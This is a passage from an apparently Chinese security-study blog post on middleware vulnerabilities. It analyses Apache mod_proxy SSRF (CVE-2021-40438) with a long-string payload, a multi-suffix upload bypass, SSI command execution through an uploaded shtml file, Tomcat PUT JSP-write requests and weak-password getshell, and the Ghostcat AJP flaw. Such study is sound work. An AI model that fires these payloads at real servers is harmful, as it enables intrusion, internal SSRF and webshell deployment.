<p>举个例子，前面介绍中的 <code>ProxyPass / &quot;unix:/var/run/www.sock|http://localhost:8080/&quot;</code> ，在解析完成后， <code>uds_path</code>  的值等于 <code>/var/run/www.sock</code> ， <code>rurl</code>  的值等于 <code>http://localhost:8080/</code> 。</p>
<p>看到这里其实都没有什么问题，那么我们肯定会思考， <code>r-&gt;filename</code>  是从哪来的，用户可控吗</p>
<p>这时就要说到另一个函数， <code>proxy_hook_canon_handler</code> ，这个函数用于注册 canon handler，每一个 <code>mod_proxy_xxx</code>  都会注册一个自己的 canon handler，canon handler 会在反代的时候被调用，用于告诉 Apache 主程序它应该把这个请求交给哪个处理方法来处理。</p>
<p>比如，我们看到 <code>mod_proxy_http</code>  的 <code>proxy_http_canon</code>  函数：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">proxy_http_canon</span><span class="params">(request_rec *r, <span class="type">char</span> *url)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// fourth part</span></span><br><span class="line">    r-&gt;filename = <span class="built_in">apr_pstrcat</span>(r-&gt;pool, <span class="string">&quot;proxy:&quot;</span>, scheme, <span class="string">&quot;://&quot;</span>, host, sport,</span><br><span class="line">            <span class="string">&quot;/&quot;</span>, path, (search) ? <span class="string">&quot;?&quot;</span> : <span class="string">&quot;&quot;</span>, (search) ? search : <span class="string">&quot;&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第三部分，拼接 <code>proxy:</code> 、scheme、 <code>://</code> 、host、sport、 <code>/</code> 、path、search，成为一个字符串，赋值给 <code>r-&gt;filename</code> 。</p>
<p>这里面，scheme、host、sport 来自于配置文件中配置的 ProxyPass，而 path、search 来自于用户发送的数据包。也就是说， <code>r-&gt;filename</code>  中的后半部分是用户可控的。</p>
<p>那我们回看前面的 <code>fix_uds_filename</code>  函数，它在 <code>r-&gt;filename</code>  中查找关键字 <code>unix:</code> ，并将这个关键字后面直到 <code>|</code>  的部分作为 unix 套接字地址，而将 <code>|</code>  后面的部分作为反代的后端地址。</p>
<p>我们可以通过请求的 path 或者 search 来控制这两个部分，控制了反代的后端地址，这也就是为什么这里会出现 SSRF 的原因。</p>
<p>这里面有一个问题，那就是 Apache 在正常情况下，因为识别到了 unix 套接字，所以会把用户请求发送给这个本地文件套接字，而不是后端 URL。</p>
<p>我们发送这样一个请求：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /?unix:/var/run/test.sock|http://example.com/ HTTP/1.1</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>此时会得到一个 503 错误</p>
<p>找不到 unix 套接字 <code>/var/run/test.sock</code> ，这是当然。</p>
<p>我们不能让他把请求发送到 unix 套接字上，而是发送给我们需要的 <code>|</code>  后面的地址。</p>
<p>在 <code>fix_uds_filename</code>  函数中，unix 套接字的地址来自于下面这两行代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">char *sockpath = ap_runtime_dir_relative(r-&gt;pool, urisock.path);</span><br><span class="line">apr_table_setn(r-&gt;notes, &quot;uds_path&quot;, sockpath);</span><br></pre></td></tr></table></figure>
<p>如果这里 <code>ap_runtime_dir_relative</code>  函数返回值是 null，则后面获取 <code>uds_path</code>  时将不会使用 unix 套接字地址，而变成普通的 TCP 连接：</p>
<p>那么如何让 <code>ap_runtime_dir_relative</code>  的返回值是 null？ <code>ap_runtime_dir_relative</code>  函数最后引用了 apr 库中的 <code>apr_filepath_merge</code>  函数，它的主要作用就是路径的 join，用于处理相对路径、绝对路径、 <code>../</code>  连接。</p>
<p>这个函数中，当待 join 的两段路径长度 + 4 大于 <code>APR_PATH_MAX</code> ，也就是 4096 的时候，则函数会返回一个路径过长的状态码，导致最后 unix 套接字的值是 null：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rootlen = <span class="built_in">strlen</span>(rootpath);</span><br><span class="line">maxlen = rootlen + <span class="built_in">strlen</span>(addpath) + <span class="number">4</span>; <span class="comment">/* 4 for slashes at start, after</span></span><br><span class="line"><span class="comment">                                             * root, and at end, plus trailing</span></span><br><span class="line"><span class="comment">                                             * null */</span></span><br><span class="line"><span class="keyword">if</span> (maxlen &gt; APR_PATH_MAX) &#123;</span><br><span class="line">    <span class="keyword">return</span> APR_ENAMETOOLONG;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也就是说，我们只需要在 <code>unix:</code>  与 <code>|</code>  之间传入内容长度大概超过 4092 的字符串，就能构造出 <code>uds_path</code>  为 null 的结果，让 Apache 不再发送请求给 unix 套接字。</p>
<p>（ <code>APR_PATH_MAX</code>  是程序宏定义的长度）</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://example.com/ HTTP/1.1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在 Apache+PHP 环境下，path 中的 <code>|</code>  被 <code>ap_proxy_canonenc</code>  函数编码成了 %7C：没有 <code>|</code> ，后面也就无法完成 SSRF 利用了。</p>
<p>那么，我们其实可以认为，如果 <code>r-&gt;filename</code>  有部分可控，且可控的部分没有被编码（不是 path），这个模块就会受到 SSRF 漏洞的影响。</p>
<p>那么，mod_proxy_http2、mod_proxy_balancer、mod_proxy_wstunnel 等这些模块也会受到影响，而 mod_proxy_uwsgi、mod_proxy_scgi 等模块不受影响。</p>
<p>这个 SSRF 漏洞是否能够 POST？答案是肯定的，理解了原理的同学肯定能明白，我们实际上是控制了反向代理的目标服务器地址。既然是反向代理，那么实际上用户请求的大部分原始数据都会被直接转发给后端，所以，我们只需要发送 POST 请求，即可让执行 POST 的 SSRF</p>
<p>另一个，这个 SSRF 漏洞是否可以打本地的 unix socket？答案是肯定的。原本这个漏洞的第一请求目标就是本地的 unix 套接字，我们使用 4092 个超长 search 绕过了这个限制让他可以打任意远程地址，只要让它回归原本的方法就可以打本地的 unix 套接字了：</p>
<p>打本地 unix 套接字的好处是可以攻击类似于 Docker、Supervisor 这样的本地服务。</p>
<p>最后一个问题，这个 SSRF 漏洞是否可以攻击一些非 HTTP 协议的服务？答案也是肯定的。TCP 是一个数据流，即使我们打出的数据包前面有 HTTP 头，这并不影响后续正常的满足二进制协议的数据流的发送与接收。不过有一个例外情况，如果目标服务有一些特殊的操作，类似于高版本 redis 读取到一些特殊的 HTTP 数据段就断开 TCP 连接这样的操作，那么可能需要进行一些额外绕过了。</p>
<p>Apache 官方对这个漏洞的修复也比较简单，因为用户只能控制 <code>r-&gt;filename</code>  的后半部分，而前半部分 <code>proxy:&#123;scheme&#125;://&#123;host&#125;&#123;sport&#125;/</code>  来自于配置文件，所以最新版改成检查其开头是不是 <code>proxy:unix:</code> ，这一部分用户无法控制。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">总结一下：</span><br><span class="line">apache在配置后端服务器的时候可以使用某个协议反代到unix套接字，比如ProxyPass / &quot;unix:/var/run/www.sock|http://localhost:8080/&quot;</span><br><span class="line">这个filename是通过拼接形成的，其中proxy:、scheme、://、host、sport、/、path、search  的path和search可控</span><br><span class="line">但是无法直接发送到后面的地址，因为他会先发到unix套接字上</span><br><span class="line">但是如果ap_runtime_dir_relative函数返回值是null，则后面获取uds_path时将不会使用unix套接字地址，而变成普通的TCP连接：</span><br><span class="line">ap_runtime_dir_relative函数最后引用了apr库中的apr_filepath_merge函数这个函数中，当待join的两段路径长度+4大于APR_PATH_MAX，也就是4096的时候，则函数会返回一个路径过长的状态码，导致最后unix套接字的值是null：</span><br><span class="line">最终payload</span><br><span class="line">http://target/?unix:&#123;&#x27;A&#x27;*5000&#125;|http://example.com/</span><br><span class="line">同时php模块不受影响，只要将| 转义为%7c的模块都无法利用</span><br><span class="line">这个漏洞也可以POST。打本地unix socket，攻击非http服务</span><br></pre></td></tr></table></figure>
<h2 id="apache-httpd-多后缀解析漏洞"><a class="markdownIt-Anchor" href="#apache-httpd-多后缀解析漏洞">#</a> Apache HTTPD 多后缀解析漏洞</h2>
<p>Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。比如，如下配置文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType text/html .html</span><br><span class="line">AddLanguage zh-CN .cn</span><br></pre></td></tr></table></figure>
<p>其给 <code>.html</code>  后缀增加了 media-type，值为 <code>text/html</code> ；给 <code>.cn</code>  后缀增加了语言，值为 <code>zh-CN</code> 。此时，如果用户请求文件 <code>index.cn.html</code> ，他将返回一个中文的 html 页面。</p>
<p>以上就是 Apache 多后缀的特性。如果运维人员给 <code>.php</code>  后缀增加了处理器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler application/x-httpd-php .php</span><br></pre></td></tr></table></figure>
<p>那么，在有多个后缀的情况下，只要一个文件含有 <code>.php</code>  后缀的文件即将被识别成 PHP 文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。</p>
<p>访问 <code>http://your-ip/uploadfiles/apache.php.jpeg</code>  即可发现，phpinfo 被执行了，该文件被解析为 php 脚本。</p>
<p><code>http://your-ip/index.php</code>  中是一个白名单检查文件后缀的上传组件，上传完成后并未重命名。我们可以通过上传文件名为 <code>xxx.php.jpg</code>  或 <code>xxx.php.jpeg</code>  的文件，利用 Apache 解析漏洞进行 getshell。</p>
<p><code>GET /uploadfiles/aaa.php.jpg</code></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vYXBhY2hlLW1vZC1wcm94eS1zc3JmLWN2ZS0yMDIxLTQwNDM4Lmh0bWw=">Apache mod_proxy SSRF（CVE-2021-40438）的一点分析和延伸 | 离别歌 (leavesongs.com)</span></p>
<h2 id="apache-ssi-远程命令执行漏洞"><a class="markdownIt-Anchor" href="#apache-ssi-远程命令执行漏洞">#</a> Apache SSI 远程命令执行漏洞</h2>
<p>在测试任意文件上传漏洞的时候，目标服务端可能不允许上传 php 后缀的文件。如果目标服务器开启了 SSI 与 CGI 支持，我们可以上传一个 shtml 文件，并利用 <code>&lt;!--#exec cmd=&quot;id&quot; --&gt;</code>  语法执行任意命令。</p>
<p>正常上传 PHP 文件是不允许的，我们可以上传一个 shell.shtml 文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd=&quot;ls&quot; --&gt;</span><br></pre></td></tr></table></figure>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230719220952085.png" alt="image-20230719220952085"></p>
<p>成功上传，然后访问 shell.shtml，可见命令已成功执行：</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230719221005889.png" alt="image-20230719221005889"></p>
<h1 id="tomcat"><a class="markdownIt-Anchor" href="#tomcat">#</a> tomcat</h1>
<h2 id="tomcat-put方法任意写文件漏洞"><a class="markdownIt-Anchor" href="#tomcat-put方法任意写文件漏洞">#</a> Tomcat PUT 方法任意写文件漏洞</h2>
<p>在 Windows 服务器下，将 readonly 参数设置为 false 时，即可通过 PUT 方式创建一个 JSP 文件，并可以执行任意代码。</p>
<p>通过阅读 conf/web.xml 文件，可以发现：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;default&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt;</span><br><span class="line">    &lt;init-param&gt;</span><br><span class="line">        &lt;param-name&gt;debug&lt;/param-name&gt;</span><br><span class="line">        &lt;param-value&gt;0&lt;/param-value&gt;</span><br><span class="line">    &lt;/init-param&gt;</span><br><span class="line">    &lt;init-param&gt;</span><br><span class="line">        &lt;param-name&gt;listings&lt;/param-name&gt;</span><br><span class="line">        &lt;param-value&gt;false&lt;/param-value&gt;</span><br><span class="line">    &lt;/init-param&gt;</span><br><span class="line">    &lt;init-param&gt;</span><br><span class="line">        &lt;param-name&gt;readonly&lt;/param-name&gt;</span><br><span class="line">        &lt;param-value&gt;false&lt;/param-value&gt;</span><br><span class="line">    &lt;/init-param&gt;</span><br><span class="line">    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br></pre></td></tr></table></figure>
<p>虽然 Tomcat 对文件后缀有一定检测（不能直接写 jsp），但我们使用一些文件系统的特性（如 Linux 下可用 <code>/</code> ）来绕过了限制。</p>
<p>可以结合 Windows 的特性。其一是 NTFS 文件流，其二是文件名的相关限制（如 Windows 中文件名不能以空格结尾）来绕过限制：</p>
<p>payload::</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PUT /111.jsp::$DATA HTTP/1.1</span><br><span class="line">Host: 10.1.1.6:8080</span><br><span class="line">User-Agent: JNTASS</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">...jsp shell...</span><br></pre></td></tr></table></figure>
<p>写入成功</p>
<p>可以上传 jSp 文件 (但不能解析)，却不可上传 jsp。 说明 tomcat 对 jsp 是做了一定处理的。那么就考虑是否可以使其处理过程中对文件名的识别存在差异性，前面的流程中 test.jsp/ 识别为非 jsp 文件，而后续保存文件的时候，文件名不接受 / 字符，故而忽略掉。</p>
<p>payload /</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PUT /222.jsp/ HTTP/1.1Host: 10.1.1.6:8080User-Agent: JNTASSDNT: 1Connection: close...jsp shell...</span><br></pre></td></tr></table></figure>
<h2 id="tomcat7-弱口令-后台getshell漏洞"><a class="markdownIt-Anchor" href="#tomcat7-弱口令-后台getshell漏洞">#</a> Tomcat7+ 弱口令 &amp;&amp; 后台 getshell 漏洞</h2>
<p>Tomcat 支持在后台部署 war 文件，可以直接将 webshell 部署到 web 目录下。其中，欲访问后台，需要对应用户有相应权限。</p>
<p>Tomcat7 + 权限分为：</p>
<ul>
<li>manager（后台管理）
<ul>
<li>manager-gui 拥有 html 页面权限</li>
<li>manager-status 拥有查看 status 的权限</li>
<li>manager-script 拥有 text 接口的权限，和 status 权限</li>
<li>manager-jmx 拥有 jmx 权限，和 status 权限</li>
</ul>
</li>
<li>host-manager（虚拟主机管理）
<ul>
<li>admin-gui 拥有 html 页面权限</li>
<li>admin-script 拥有 text 接口权限</li>
</ul>
</li>
</ul>
<p>在 <code>conf/tomcat-users.xml</code>  文件中配置用户的权限：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;tomcat-users xmlns=&quot;http://tomcat.apache.org/xml&quot;</span><br><span class="line">              xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">              xsi:schemaLocation=&quot;http://tomcat.apache.org/xml tomcat-users.xsd&quot;</span><br><span class="line">              version=&quot;1.0&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;role rolename=&quot;manager-gui&quot;/&gt;</span><br><span class="line">    &lt;role rolename=&quot;manager-script&quot;/&gt;</span><br><span class="line">    &lt;role rolename=&quot;manager-jmx&quot;/&gt;</span><br><span class="line">    &lt;role rolename=&quot;manager-status&quot;/&gt;</span><br><span class="line">    &lt;role rolename=&quot;admin-gui&quot;/&gt;</span><br><span class="line">    &lt;role rolename=&quot;admin-script&quot;/&gt;</span><br><span class="line">    &lt;user username=&quot;tomcat&quot; password=&quot;tomcat&quot; roles=&quot;manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script&quot; /&gt;</span><br><span class="line">    </span><br><span class="line">&lt;/tomcat-users&gt;</span><br></pre></td></tr></table></figure>
<p>可见，用户 tomcat 拥有上述所有权限，密码是 <code>tomcat</code> 。</p>
<p>正常安装的情况下，tomcat8 中默认没有任何用户，且 manager 页面只允许本地 IP 访问。只有管理员手工修改了这些属性的情况下，才可以进行攻击。</p>
<p>打开 tomcat 管理页面 <code>http://your-ip:8080/manager/html</code> ，输入弱密码 <code>tomcat:tomcat</code> ，即可访问后台：</p>
<p>上传 war 包即可直接 getshell。</p>
<h2 id="aapache-tomcat-ajp-文件包含漏洞"><a class="markdownIt-Anchor" href="#aapache-tomcat-ajp-文件包含漏洞">#</a> Aapache Tomcat AJP 文件包含漏洞</h2>
<p>由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。</p>
<p>Tomcat Connector 是 Tomcat 与外部连接的通道，它使得 Catalina 能够接收来自外部的请求，传递给对应的 Web 应用程序处理，并返回请求的响应结果。</p>
<p>默认情况下，Tomcat 配置了两个 Connector，它们分别是 HTTP Connector 和 AJP Connector：</p>
<p>HTTP Connector：用于处理 HTTP 协议的请求（HTTP/1.1），默认监听地址为 0.0.0.0:8080</p>
<p>AJP Connector：用于处理 AJP 协议的请求（AJP/1.3），默认监听地址为 0.0.0.0:8009</p>
<p>HTTP Connector 就是用来提供我们经常用到的 HTTP Web 服务。而 AJP Connector，它使用的是 AJP 协议（Apache Jserv Protocol），AJP 协议可以理解为 HTTP 协议的二进制性能优化版本，它能降低 HTTP 请求的处理成本，因此主要在需要集群、反向代理的场景被使用。</p>
<p>对于处在漏洞影响版本范围内的 Tomcat 而言，若其开启 AJP Connector 且攻击者能够访问 AJP Connector 服务端口的情况下，即存在被 Ghostcat 漏洞利用的风险。</p>
<p>注意 Tomcat AJP Connector 默认配置下即为开启状态，且监听在 0.0.0.0:8009 。</p>

  </div>

   <footer>

    <div class="meta">
  <span class="item">
    <span class="icon">
      <i class="ic i-calendar-check"></i>
    </span>
    <span class="text">Edited on</span>
    <time title="Modified: 2023-07-26 19:51:24" itemprop="dateModified" datetime="2023-07-26T19:51:24+08:00">2023-07-26</time>
  </span>
</div>

      
<div class="reward">
  <button><i class="ic i-heartbeat"></i> Donate</button>
  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
  <div id="qr">
      
      <div>
        <img data-src="/images/wechatpay.png" alt="John Doe WeChat Pay">
        <p>WeChat Pay</p>
      </div>
      
      <div>
        <img data-src="/images/alipay.png" alt="John Doe Alipay">
        <p>Alipay</p>
      </div>
      
      <div>
        <img data-src="/images/paypal.png" alt="John Doe PayPal">
        <p>PayPal</p>
      </div>
  </div>
</div>

      

<div id="copyright">
<ul>
  <li class="author">
    <strong>Post author:  </strong>John Doe <i class="ic i-at"><em>@</em></i>Hexo
  </li>
  <li class="link">
    <strong>Post link: </strong>
    <a href="http://example.com/2023/07/15/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/" title="中间件漏洞">http://example.com/2023/07/15/中间件漏洞/</a>
  </li>
  <li class="license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

  </footer>

</article>

  </div>
  

<div class="post-nav">
    <div class="item left">
      

